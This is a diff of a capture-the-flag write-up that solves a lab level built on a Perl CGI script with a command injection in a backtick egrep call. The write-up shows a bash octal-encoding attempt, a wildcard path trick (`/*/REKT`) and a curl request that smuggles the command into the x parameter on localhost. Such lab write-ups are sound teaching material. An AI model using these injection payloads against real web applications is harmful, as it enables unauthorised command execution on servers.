@@ -33,6 +33,7 @@ sub n {
 
 n(t(param("x"), param("y")));
 ```
+
 It will display one or two dots depending on the values of x and y. The vulnerability is quite clear, there is a command run with backticks: `` `egrep "^$xx" /tmp/xd 2>&1` ``. We can focus on the important parts.
 
 ```perl
@@ -48,9 +49,10 @@ The difficulty lies in the fact that our `x` parameter will be put in uppercase 
 
 `bash` variables can be written in octal notation, which doesn't use any lowercase letter or space. We could execute `getflag | wall` like that: `G=$'\147\145\164\146\154\141\147';W=$'\167\141\154\154';$G|$W`. Thinking that the semicolons were the problem, we put `getflag | wall` in `/tmp/REKT` and tried to encode `tmp`. Still didn't work. It turns out Perl executes `sh`, which doesn't allow the octal notation.
 
-We still had our `/tmp/REKT` file and had to find a way to execute it without writing `tmp` explicitly. This is when wildcards came to mind. 
+We still had our `/tmp/REKT` file and had to find a way to execute it without writing `tmp` explicitly. This is when wildcards came to mind.
+
 ```bash
 $ echo 'getflag | wall' > /tmp/REKT
 $ chmod +x /tmp/REKT
-$ curl 'http://localhost:4646/?y=o&x=`/*/REKT`'
+$ curl 'http://localhost:4646?x=`/*/REKT`'
 ```
